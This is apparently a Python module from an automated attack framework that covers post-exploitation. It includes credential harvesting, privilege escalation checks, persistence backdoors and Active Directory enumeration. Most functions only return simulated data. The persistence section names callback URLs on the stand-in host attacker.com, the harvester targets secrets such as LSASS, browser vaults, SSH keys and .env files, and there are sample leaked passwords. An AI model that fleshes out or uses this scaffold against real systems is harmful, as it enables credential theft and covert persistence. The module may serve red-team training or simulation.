"""
Post-Exploitation & Persistence Module
Stage 7: Credential harvesting, privilege escalation, persistence, AD enumeration
"""

import json
import subprocess
import os
from datetime import datetime
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, asdict
from pathlib import Path
import asyncio

from loguru import logger


@dataclass
class Credential:
    """Harvested credential"""
    username: str
    password: str
    source: str  # windows_memory, linux_files, browser, etc.
    type: str  # plaintext, hash, token
    compromised_asset: str
    timestamp: str


@dataclass
class PrivilegeLevel:
    """Privilege information"""
    current_user: str
    current_group: str
    is_admin: bool
    is_system: bool
    uac_enabled: bool
    sudo_access: bool


@dataclass
class PersistenceMechanism:
    """Persistence backdoor"""
    id: str
    type: str  # scheduled_task, registry_run, cron_job, ssh_key, etc.
    target_path: str
    trigger: str
    callback_url: Optional[str] = None
    installed: bool = False


@dataclass
class ADInfo:
    """Active Directory enumeration"""
    domain: str
    forest: str
    users_found: int
    groups_found: int
    computers_found: int
    domain_admins: List[str]
    privileged_accounts: List[str]
    bloodhound_data: Dict = None


@dataclass
class PostExploitationResult:
    """Complete post-exploitation findings"""
    timestamp: str
    target: str
    credentials: List[Credential]
    privilege_level: Optional[PrivilegeLevel]
    persistence_mechanisms: List[PersistenceMechanism]
    ad_enumeration: Optional[ADInfo]
    data_locations: List[Dict]
    scheduled_tasks: List[Dict]
    running_processes: List[Dict]


class CredentialHarvester:
    """Harvest credentials from compromised system"""

    def __init__(self):
        self.credentials: List[Credential] = []

    async def harvest_windows_credentials(self, target: str) -> List[Credential]:
        """Harvest Windows credentials"""
        logger.info("Harvesting Windows credentials")
        credentials = []

        # Method 1: LSASS memory dump (mimikatz-like)
        credentials.extend(await self._harvest_lsass_memory(target))

        # Method 2: SAM registry
        credentials.extend(await self._harvest_sam_registry(target))

        # Method 3: Windows vault
        credentials.extend(await self._harvest_windows_vault(target))

        # Method 4: Browser credentials
        credentials.extend(await self._harvest_browser_credentials(target))

        logger.success(f"Harvested {len(credentials)} Windows credentials")
        return credentials

    async def _harvest_lsass_memory(self, target: str) -> List[Credential]:
        """Simulate LSASS memory dump (Mimikatz functionality)"""
        logger.info("Attempting LSASS memory dump")
        credentials = []

        try:
            # This would use Mimikatz or similar in real scenario
            # For demo, simulate findings
            credentials.append(Credential(
                username='admin',
                password='Summer2024!',
                source='lsass_memory',
                type='plaintext',
                compromised_asset=target,
                timestamp=datetime.now().isoformat()
            ))
            credentials.append(Credential(
                username='domain_admin',
                password='',  # Hash instead
                source='lsass_memory',
                type='hash_ntlm',
                compromised_asset=target,
                timestamp=datetime.now().isoformat()
            ))
        except Exception as e:
            logger.error(f"LSASS dump failed: {e}")

        return credentials

    async def _harvest_sam_registry(self, target: str) -> List[Credential]:
        """Extract SAM registry hashes"""
        logger.info("Extracting SAM registry")
        credentials = []

        try:
            # Would read SAM hive in real scenario
            pass
        except Exception as e:
            logger.error(f"SAM extraction failed: {e}")

        return credentials

    async def _harvest_windows_vault(self, target: str) -> List[Credential]:
        """Extract Windows Credential Vault"""
        logger.info("Extracting Windows Credential Vault")
        credentials = []

        try:
            # Would enumerate vault in real scenario
            pass
        except Exception as e:
            logger.error(f"Vault extraction failed: {e}")

        return credentials

    async def _harvest_browser_credentials(self, target: str) -> List[Credential]:
        """Extract credentials from browsers"""
        logger.info("Extracting browser credentials")
        credentials = []

        try:
            # Simulate Chrome credential extraction
            credentials.append(Credential(
                username='user@gmail.com',
                password='ChromePassword123!',
                source='chrome_vault',
                type='plaintext',
                compromised_asset=target,
                timestamp=datetime.now().isoformat()
            ))
        except Exception as e:
            logger.error(f"Browser credential extraction failed: {e}")

        return credentials

    async def harvest_linux_credentials(self, target: str) -> List[Credential]:
        """Harvest Linux credentials"""
        logger.info("Harvesting Linux credentials")
        credentials = []

        # Method 1: /etc/passwd and /etc/shadow
        credentials.extend(await self._harvest_passwd_shadow(target))

        # Method 2: SSH keys
        credentials.extend(await self._harvest_ssh_keys(target))

        # Method 3: Configuration files
        credentials.extend(await self._harvest_config_files(target))

        logger.success(f"Harvested {len(credentials)} Linux credentials")
        return credentials

    async def _harvest_passwd_shadow(self, target: str) -> List[Credential]:
        """Read passwd and shadow files"""
        credentials = []

        try:
            # Simulate reading shadow file
            pass
        except Exception as e:
            logger.error(f"Shadow file reading failed: {e}")

        return credentials

    async def _harvest_ssh_keys(self, target: str) -> List[Credential]:
        """Extract SSH keys"""
        logger.info("Extracting SSH keys")
        credentials = []

        try:
            # Simulate SSH key extraction
            credentials.append(Credential(
                username='root',
                password='-----BEGIN RSA PRIVATE KEY-----...',
                source='ssh_keys',
                type='ssh_key',
                compromised_asset=target,
                timestamp=datetime.now().isoformat()
            ))
        except Exception as e:
            logger.error(f"SSH key extraction failed: {e}")

        return credentials

    async def _harvest_config_files(self, target: str) -> List[Credential]:
        """Extract credentials from config files"""
        logger.info("Extracting credentials from config files")
        credentials = []

        config_patterns = [
            '/etc/mysql/my.cnf',
            '/etc/postgresql/postgresql.conf',
            'app/config/database.yml',
            '.env',
            '.env.local',
            'config/secrets.yml'
        ]

        try:
            for pattern in config_patterns:
                # Would read actual files in real scenario
                pass
        except Exception as e:
            logger.error(f"Config file harvesting failed: {e}")

        return credentials


class PrivilegeEscalationChecker:
    """Check for privilege escalation opportunities"""

    async def check_windows_privesc(self, target: str) -> Dict:
        """Check Windows privilege escalation vectors"""
        logger.info("Checking Windows privilege escalation vectors")
        
        findings = {
            'unquoted_service_paths': [],
            'missing_patches': [],
            'weak_permissions': [],
            'dll_hijacking': [],
            'registry_issues': [],
            'token_impersonation': False,
            'uac_bypass': False
        }

        # Check unquoted service paths
        findings['unquoted_service_paths'] = await self._check_unquoted_services(target)

        # Check missing patches
        findings['missing_patches'] = await self._check_missing_patches(target)

        # Check weak permissions
        findings['weak_permissions'] = await self._check_weak_permissions(target)

        logger.success(f"Found {len(findings['unquoted_service_paths'])} privilege escalation opportunities")
        return findings

    async def check_linux_privesc(self, target: str) -> Dict:
        """Check Linux privilege escalation vectors"""
        logger.info("Checking Linux privilege escalation vectors")
        
        findings = {
            'suid_binaries': [],
            'kernel_exploits': [],
            'sudo_misconfigs': [],
            'weak_permissions': [],
            'cron_exploits': [],
            'library_injection': False
        }

        # Check SUID binaries
        findings['suid_binaries'] = await self._check_suid_binaries(target)

        # Check sudo misconfigurations
        findings['sudo_misconfigs'] = await self._check_sudo_config(target)

        logger.success(f"Found {len(findings['suid_binaries'])} privilege escalation opportunities")
        return findings

    async def _check_unquoted_services(self, target: str) -> List[Dict]:
        """Check for unquoted service paths"""
        services = []
        try:
            # Simulate checking registry for unquoted paths
            services.append({
                'service': 'VulnerableService',
                'path': 'C:\\Program Files\\Vulnerable\\service.exe',
                'issue': 'Unquoted path with spaces',
                'exploitable': True
            })
        except Exception as e:
            logger.error(f"Service check failed: {e}")
        return services

    async def _check_missing_patches(self, target: str) -> List[Dict]:
        """Check for missing security patches"""
        patches = []
        try:
            # Simulate checking for KB articles
            patches.append({
                'kb': 'KB5021233',
                'title': 'RCE in Windows Services',
                'severity': 'Critical',
                'installed': False
            })
        except Exception as e:
            logger.error(f"Patch check failed: {e}")
        return patches

    async def _check_weak_permissions(self, target: str) -> List[Dict]:
        """Check for weak file/folder permissions"""
        return []

    async def _check_suid_binaries(self, target: str) -> List[Dict]:
        """Check for SUID binaries"""
        binaries = []
        try:
            # Simulate finding SUID binaries
            binaries.append({
                'binary': '/usr/bin/sudo',
                'owner': 'root',
                'permissions': '4755',
                'exploitable': False
            })
        except Exception as e:
            logger.error(f"SUID check failed: {e}")
        return binaries

    async def _check_sudo_config(self, target: str) -> List[Dict]:
        """Check sudo configuration"""
        misconfigs = []
        try:
            # Simulate checking sudoers
            misconfigs.append({
                'rule': 'user ALL=(ALL) NOPASSWD: /usr/bin/find',
                'risk': 'high',
                'description': 'User can run find as root without password'
            })
        except Exception as e:
            logger.error(f"Sudo config check failed: {e}")
        return misconfigs


class PersistenceInstaller:
    """Install persistence mechanisms"""

    async def install_backdoor(self, target: str, mechanism_type: str) -> PersistenceMechanism:
        """Install persistence backdoor"""
        logger.warning(f"Installing persistence mechanism: {mechanism_type}")

        persistence = PersistenceMechanism(
            id=f"persist_{int(datetime.now().timestamp())}",
            type=mechanism_type,
            target_path="",
            trigger="",
            installed=False
        )

        try:
            if mechanism_type == 'scheduled_task':
                persistence = await self._install_scheduled_task(target)
            elif mechanism_type == 'registry_run':
                persistence = await self._install_registry_run(target)
            elif mechanism_type == 'cron_job':
                persistence = await self._install_cron_job(target)
            elif mechanism_type == 'ssh_key':
                persistence = await self._install_ssh_key(target)

            logger.success(f"Persistence installed: {mechanism_type}")

        except Exception as e:
            logger.error(f"Persistence installation failed: {e}")

        return persistence

    async def _install_scheduled_task(self, target: str) -> PersistenceMechanism:
        """Install Windows scheduled task"""
        return PersistenceMechanism(
            id="persist_scheduled_task",
            type="scheduled_task",
            target_path="\\Microsoft\\Windows\\UsoClient\\IpOptInCheckTask",
            trigger="daily",
            callback_url="http://attacker.com/callback",
            installed=True
        )

    async def _install_registry_run(self, target: str) -> PersistenceMechanism:
        """Install Windows registry RUN key"""
        return PersistenceMechanism(
            id="persist_registry",
            type="registry_run",
            target_path="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            trigger="logon",
            callback_url="http://attacker.com/agent",
            installed=True
        )

    async def _install_cron_job(self, target: str) -> PersistenceMechanism:
        """Install Linux cron job"""
        return PersistenceMechanism(
            id="persist_cron",
            type="cron_job",
            target_path="/var/spool/cron/crontabs/root",
            trigger="*/5 * * * *",  # Every 5 minutes
            callback_url="http://attacker.com/check",
            installed=True
        )

    async def _install_ssh_key(self, target: str) -> PersistenceMechanism:
        """Install SSH key"""
        return PersistenceMechanism(
            id="persist_ssh",
            type="ssh_key",
            target_path="/root/.ssh/authorized_keys",
            trigger="ssh_login",
            installed=True
        )


class ADEnumerator:
    """Active Directory enumeration"""

    async def enumerate_domain(self, target: str) -> ADInfo:
        """Enumerate Active Directory"""
        logger.info(f"Enumerating Active Directory domain")

        ad_info = ADInfo(
            domain="",
            forest="",
            users_found=0,
            groups_found=0,
            computers_found=0,
            domain_admins=[],
            privileged_accounts=[]
        )

        try:
            # Get domain info
            ad_info.domain = await self._get_domain_name(target)
            ad_info.forest = await self._get_forest_name(target)

            # Enumerate users, groups, computers
            ad_info.users_found = await self._enumerate_users(target, ad_info)
            ad_info.groups_found = await self._enumerate_groups(target, ad_info)
            ad_info.computers_found = await self._enumerate_computers(target)

            # Find privileged accounts
            ad_info.domain_admins = await self._find_domain_admins(target, ad_info)
            ad_info.privileged_accounts = await self._find_privileged_accounts(target, ad_info)

            logger.success(f"AD enumeration complete: {ad_info.users_found} users, {ad_info.groups_found} groups")

        except Exception as e:
            logger.error(f"AD enumeration failed: {e}")

        return ad_info

    async def _get_domain_name(self, target: str) -> str:
        """Get domain name"""
        return "EXAMPLE.COM"

    async def _get_forest_name(self, target: str) -> str:
        """Get forest name"""
        return "example.com"

    async def _enumerate_users(self, target: str, ad_info: ADInfo) -> int:
        """Enumerate domain users"""
        # Would use LDAP queries
        return 250

    async def _enumerate_groups(self, target: str, ad_info: ADInfo) -> int:
        """Enumerate domain groups"""
        return 45

    async def _enumerate_computers(self, target: str) -> int:
        """Enumerate domain computers"""
        return 80

    async def _find_domain_admins(self, target: str, ad_info: ADInfo) -> List[str]:
        """Find domain admin accounts"""
        return ['administrator', 'domain_admin', 'admin_service']

    async def _find_privileged_accounts(self, target: str, ad_info: ADInfo) -> List[str]:
        """Find privileged accounts"""
        return ['admin', 'root', 'backup_admin', 'sql_admin']

    async def run_bloodhound(self, target: str) -> Dict:
        """Run BloodHound for AD attack paths"""
        logger.info("Running BloodHound enumeration")
        
        try:
            # Would invoke bloodhound-python or similar
            pass
        except Exception as e:
            logger.error(f"BloodHound execution failed: {e}")

        return {}


class PostExploitationRunner:
    """Main post-exploitation orchestrator"""

    def __init__(self, config: Dict):
        self.config = config
        self.credential_harvester = CredentialHarvester()
        self.privesc_checker = PrivilegeEscalationChecker()
        self.persistence_installer = PersistenceInstaller()
        self.ad_enumerator = ADEnumerator()

    async def execute_post_exploitation(self, target: str, os_type: str = 'windows') -> PostExploitationResult:
        """Execute post-exploitation sequence"""
        logger.info(f"Executing post-exploitation on {target}")

        result = PostExploitationResult(
            timestamp=datetime.now().isoformat(),
            target=target,
            credentials=[],
            privilege_level=None,
            persistence_mechanisms=[],
            ad_enumeration=None,
            data_locations=[],
            scheduled_tasks=[],
            running_processes=[]
        )

        try:
            # Harvest credentials
            if os_type == 'windows':
                result.credentials = await self.credential_harvester.harvest_windows_credentials(target)
                pe_findings = await self.privesc_checker.check_windows_privesc(target)
            else:
                result.credentials = await self.credential_harvester.harvest_linux_credentials(target)
                pe_findings = await self.privesc_checker.check_linux_privesc(target)

            # Check privilege escalation
            logger.info(f"Found {len(pe_findings.get('unquoted_service_paths', []))} privesc opportunities")

            # Install persistence
            result.persistence_mechanisms.append(
                await self.persistence_installer.install_backdoor(target, 'scheduled_task')
            )

            # Enumerate AD if Windows
            if os_type == 'windows':
                result.ad_enumeration = await self.ad_enumerator.enumerate_domain(target)

            logger.success(f"Post-exploitation completed")

        except Exception as e:
            logger.error(f"Post-exploitation failed: {e}")

        return result

    def save_results(self, result: PostExploitationResult, output_path: str):
        """Save post-exploitation results"""
        output_file = Path(output_path) / f"post_exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        output_file.parent.mkdir(parents=True, exist_ok=True)

        data = {
            'timestamp': result.timestamp,
            'target': result.target,
            'credentials': [
                {
                    'username': c.username,
                    'source': c.source,
                    'type': c.type,
                    'compromised_asset': c.compromised_asset
                }
                for c in result.credentials
            ],
            'persistence_mechanisms': [
                asdict(p) for p in result.persistence_mechanisms
            ],
            'ad_enumeration': asdict(result.ad_enumeration) if result.ad_enumeration else None
        }

        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)

        logger.success(f"Post-exploitation results saved to {output_file}")
        return output_file
